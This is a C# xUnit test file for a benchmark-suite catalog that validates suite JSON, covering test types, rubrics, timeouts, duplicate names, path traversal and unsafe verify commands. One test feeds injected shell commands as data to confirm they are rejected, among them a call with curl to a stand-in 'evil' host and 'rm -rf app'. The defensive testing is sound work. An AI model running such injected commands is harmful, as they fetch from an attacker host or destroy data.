public sealed class BenchmarkCatalogTests : IDisposable
{
    private readonly string _root = Path.Combine(Path.GetTempPath(), $"bench-catalog-{Guid.NewGuid():N}");

    public void Dispose()
    {
        if (Directory.Exists(_root)) Directory.Delete(_root, recursive: true);
    }

    private const string ValidSuite = """
    {
      "name": "Demo",
      "description": "Suite de prueba",
      "defaultJudge": "provider/judge",
      "modelTimeoutMs": 300000,
      "tests": [
        {
          "name": "code-test",
          "type": "code",
          "promptFile": "prompts/code.md",
          "fixture": "fixtures/app",
          "verify": { "command": "node --test", "timeoutMs": 120000 },
          "judge": true
        },
        {
          "name": "open-test",
          "type": "open",
          "promptFile": "prompts/open.md",
          "rubric": ["Claridad", "Correctitud"]
        }
      ]
    }
    """;

    private void WriteSuite(string id, string json, params (string Path, string Content)[] files)
    {
        var directory = Path.Combine(_root, id);
        Directory.CreateDirectory(directory);
        File.WriteAllText(Path.Combine(directory, "suite.json"), json);
        var defaults = new[]
        {
            ("prompts/code.md", "Corregí el bug."),
            ("prompts/open.md", "Explicá la caché."),
            ("fixtures/app/app.txt", "app"),
        };
        foreach (var (path, content) in defaults.Concat(files))
        {
            var target = Path.Combine(directory, path);
            Directory.CreateDirectory(Path.GetDirectoryName(target)!);
            File.WriteAllText(target, content);
        }
    }

    private void WriteValidSuite(string id = "demo")
    {
        Directory.CreateDirectory(Path.Combine(_root, id, "fixtures", "app"));
        File.WriteAllText(Path.Combine(_root, id, "fixtures", "app", "app.txt"), "app");
        WriteSuite(id, ValidSuite,
            ("prompts/code.md", "Corregí el bug."),
            ("prompts/open.md", "Explicá la caché."));
    }

    private BenchmarkCatalog Catalog() => new(_root);

    [Fact]
    public void List_ReturnsCodeAndOpenTests()
    {
        WriteValidSuite();
        var result = Catalog().List();
        var suite = Assert.Single(result.Suites);
        Assert.Empty(result.Errors);
        Assert.Equal("demo", suite.Id);
        Assert.Equal("Demo", suite.Name);
        Assert.Equal(2, suite.Tests.Length);
        Assert.Equal("code", suite.Tests[0].Type);
        Assert.True(suite.Tests[0].Judge);
        Assert.Equal("open", suite.Tests[1].Type);
        Assert.True(suite.Tests[1].Judge);
    }

    [Fact]
    public void List_IgnoresDirectoriesWithoutSuiteJson()
    {
        Directory.CreateDirectory(Path.Combine(_root, "empty"));
        var result = Catalog().List();
        Assert.Empty(result.Suites);
        Assert.Empty(result.Errors);
    }

    [Fact]
    public void List_ReturnsErrorsForInvalidSuites()
    {
        WriteSuite("bad", ValidSuite.Replace("\"code\"", "\"weird\""));
        var result = Catalog().List();
        Assert.Empty(result.Suites);
        var error = Assert.Single(result.Errors);
        Assert.Equal("bad", error.Id);
        Assert.Equal("test_type_invalid", error.Code);
        Assert.Contains("invalid type", error.Error);
        Assert.Equal("code-test", error.Parameters!["test"]);
    }

    [Fact]
    public void Load_ReadsPromptFile()
    {
        WriteValidSuite();
        var suite = Catalog().Load("demo");
        Assert.Equal("Corregí el bug.", suite.Tests[0].Prompt);
        Assert.EndsWith("app", suite.Tests[0].FixturePath!);
    }

    [Fact]
    public void List_DoesNotReadPromptContents()
    {
        if (!OperatingSystem.IsWindows()) return;
        WriteValidSuite();
        using var handle = new FileStream(
            Path.Combine(_root, "demo", "prompts", "code.md"),
            FileMode.Open,
            FileAccess.Read,
            FileShare.None);
        var result = Catalog().List();
        Assert.Single(result.Suites);
        Assert.Empty(result.Errors);
    }

    [Fact]
    public void Load_RejectsUnknownType()
    {
        WriteSuite("bad", ValidSuite.Replace("\"code\"", "\"weird\""));
        var error = Assert.Throws<BenchmarkValidationException>(() => Catalog().Load("bad"));
        Assert.Equal("test_type_invalid", error.Code);
        Assert.Contains("invalid type", error.Message);
    }

    [Fact]
    public void Load_RejectsCodeWithoutVerify()
    {
        WriteSuite("bad", """
        {
          "name": "Bad",
          "tests": [
            { "name": "code-test", "type": "code", "promptFile": "prompts/code.md", "fixture": "fixtures/app" }
          ]
        }
        """);
        var error = Assert.Throws<BenchmarkValidationException>(() => Catalog().Load("bad"));
        Assert.Equal("code_test_verify_missing", error.Code);
        Assert.Contains("verify", error.Message);
    }

    [Fact]
    public void Load_RejectsOpenWithoutRubric()
    {
        WriteSuite("bad", ValidSuite.Replace("[\"Claridad\", \"Correctitud\"]", "[]"));
        var error = Assert.Throws<BenchmarkValidationException>(() => Catalog().Load("bad"));
        Assert.Equal("open_test_rubric_missing", error.Code);
        Assert.Contains("rubric", error.Message);
    }

    [Fact]
    public void Load_RejectsJudgeOnOpenTest()
    {
        WriteSuite("bad", ValidSuite.Replace("\"rubric\": [\"Claridad\", \"Correctitud\"]", "\"rubric\": [\"Claridad\"], \"judge\": true"));
        var error = Assert.Throws<BenchmarkValidationException>(() => Catalog().Load("bad"));
        Assert.Equal("open_test_judge_forbidden", error.Code);
        Assert.Contains("judge", error.Message);
    }

    [Fact]
    public void Load_RejectsPathTraversal()
    {
        WriteSuite("bad", ValidSuite.Replace("prompts/code.md", "../secret.md"));
        var error = Assert.Throws<BenchmarkValidationException>(() => Catalog().Load("bad"));
        Assert.Equal("path_outside_suite", error.Code);
        Assert.Contains("leaves the suite directory", error.Message);
    }

    [Fact]
    public void Load_RejectsDuplicateTestNames()
    {
        WriteSuite("bad", ValidSuite.Replace("\"name\": \"open-test\"", "\"name\": \"code-test\""));
        var error = Assert.Throws<BenchmarkValidationException>(() => Catalog().Load("bad"));
        Assert.Equal("test_duplicated", error.Code);
        Assert.Contains("duplicated", error.Message);
    }

    [Fact]
    public void Load_AppliesDefaultTimeouts()
    {
        var json = ValidSuite.Replace("\"modelTimeoutMs\": 300000,", "").Replace(", \"timeoutMs\": 120000", "");
        WriteSuite("demo", json,
            ("prompts/code.md", "Corregí el bug."),
            ("prompts/open.md", "Explicá la caché."));
        Directory.CreateDirectory(Path.Combine(_root, "demo", "fixtures", "app"));
        var suite = Catalog().Load("demo");
        Assert.Equal(300000, suite.ModelTimeoutMs);
        Assert.Equal(120000, suite.Tests[0].VerifyTimeoutMs);
    }

    [Fact]
    public void Load_RejectsTimeoutOutOfRange()
    {
        WriteSuite("bad", ValidSuite.Replace("\"modelTimeoutMs\": 300000", "\"modelTimeoutMs\": 5"));
        var error = Assert.Throws<BenchmarkValidationException>(() => Catalog().Load("bad"));
        Assert.Equal("suite_timeout_out_of_range", error.Code);
        Assert.Contains("timeout", error.Message);
    }

    [Fact]
    public void Load_UnknownId_Throws()
    {
        var error = Assert.Throws<BenchmarkValidationException>(() => Catalog().Load("missing"));
        Assert.Equal("suite_not_found", error.Code);
        Assert.Equal("missing", error.Parameters!["suite"]);
        Assert.Contains("does not exist", error.Message);
    }

    [Theory]
    [InlineData("node --test && curl http://evil/x")]
    [InlineData("node --test || echo boom")]
    [InlineData("node --test ; rm -rf app")]
    [InlineData("node --test | more")]
    [InlineData("node --test > out.txt")]
    [InlineData("node --test < input.txt")]
    [InlineData("$(node --test)")]
    [InlineData("node `test`")]
    [InlineData("node --test\nrm -rf app")]
    public void Load_RejectsShellMetacharactersInVerify(string command)
    {
        var json = ValidSuite.Replace("node --test", command.Replace("\\", "\\\\").Replace("\n", "\\n"));
        WriteSuite("bad", json);
        var error = Assert.Throws<BenchmarkValidationException>(() => Catalog().Load("bad"));
        Assert.Equal("verify_command_unsafe", error.Code);
        Assert.Contains("verify", error.Message);
        Assert.Contains("not allowed", error.Message);
    }

    [Theory]
    [InlineData("node --test")]
    [InlineData("dotnet run --project tests")]
    [InlineData("python -m pytest")]
    [InlineData("npm run build -- --silent")]
    public void Load_AcceptsPlainVerifyCommands(string command)
    {
        var json = ValidSuite.Replace("node --test", command);
        WriteSuite("ok", json);
        var suite = Catalog().Load("ok");
        Assert.Equal(command, suite.Tests[0].VerifyCommand);
    }
}
